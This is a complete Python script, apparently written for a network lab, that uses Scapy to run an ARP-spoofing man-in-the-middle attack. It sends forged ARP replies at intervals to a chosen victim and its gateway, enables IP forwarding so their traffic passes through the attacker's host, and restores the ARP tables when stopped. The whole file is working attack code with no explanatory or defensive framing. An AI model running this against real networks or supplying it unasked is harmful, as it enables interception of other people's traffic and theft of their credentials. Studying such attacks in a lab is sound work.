#!/usr/bin/env python3
import argparse
import os
import signal
import sys
import time

from scapy.all import ARP, Ether, conf, get_if_hwaddr, getmacbyip, sendp


def enable_ip_forward():
    # Best-effort enable (won't fail the script if it can't).
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1\n")
    except Exception:
        pass


def arp_reply(spoof_ip: str, target_ip: str, target_mac: str, attacker_mac: str):
    # ARP "is-at" reply: spoof_ip is-at attacker_mac, sent to target_ip/target_mac
    return Ether(dst=target_mac, src=attacker_mac) / ARP(
        op=2,           # is-at (reply)
        psrc=spoof_ip,  # pretend to be this IP
        pdst=target_ip, # tell this target
        hwsrc=attacker_mac,
        hwdst=target_mac
    )


def restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, iface, count=5):
    # Restore victim: gateway_ip is-at gateway_mac
    pkt_v = Ether(dst=victim_mac) / ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwsrc=gateway_mac, hwdst=victim_mac)
    # Restore gateway: victim_ip is-at victim_mac
    pkt_g = Ether(dst=gateway_mac) / ARP(op=2, psrc=victim_ip, pdst=gateway_ip, hwsrc=victim_mac, hwdst=gateway_mac)

    for _ in range(count):
        sendp(pkt_v, iface=iface, verbose=0)
        sendp(pkt_g, iface=iface, verbose=0)
        time.sleep(0.2)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("victim_ip", help="Victim IP (e.g. Bowser)")
    parser.add_argument("gateway_ip", help="Gateway IP (e.g. r1 SVI)")
    parser.add_argument("-i", "--iface", default=None, help="Interface to use (default: Scapy conf.iface)")
    parser.add_argument("-t", "--interval", type=float, default=2.0, help="Seconds between poison bursts (default: 2)")
    args = parser.parse_args()

    if os.geteuid() != 0:
        print("[!] Run as root (sudo).")
        sys.exit(1)

    iface = args.iface or conf.iface
    victim_ip = args.victim_ip
    gateway_ip = args.gateway_ip

    attacker_mac = get_if_hwaddr(iface)
    print(f"[+] Using iface: {iface}")
    print(f"[+] Attacker MAC: {attacker_mac}")

    print("[*] Resolving MAC addresses (via ARP requests)...")
    victim_mac = getmacbyip(victim_ip)
    gateway_mac = getmacbyip(gateway_ip)

    if not victim_mac:
        print("[!] Victim MAC not found (victim unreachable?)")
        sys.exit(1)
    if not gateway_mac:
        print("[!] Gateway MAC not found (gateway unreachable?)")
        sys.exit(1)

    print(f"[+] Victim:  {victim_ip} -> {victim_mac}")
    print(f"[+] Gateway: {gateway_ip} -> {gateway_mac}")

    enable_ip_forward()
    print("[*] (Best-effort) Enabled net.ipv4.ip_forward=1")
    print("[*] Poisoning started. Ctrl+C to stop and restore ARP tables.")

    stop = False

    def handle_sigint(_sig, _frame):
        nonlocal stop
        stop = True

    signal.signal(signal.SIGINT, handle_sigint)

    try:
        while not stop:
            # Tell victim: "gateway_ip is at attacker_mac"
            pkt_to_victim = arp_reply(gateway_ip, victim_ip, victim_mac, attacker_mac)
            # Tell gateway: "victim_ip is at attacker_mac"
            pkt_to_gateway = arp_reply(victim_ip, gateway_ip, gateway_mac, attacker_mac)

            sendp(pkt_to_victim, iface=iface, verbose=0)
            sendp(pkt_to_gateway, iface=iface, verbose=0)

            time.sleep(args.interval)

    finally:
        print("\n[*] Restoring ARP tables...")
        restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, iface)
        print("[+] Done. Exiting.")


if __name__ == "__main__":
    main()
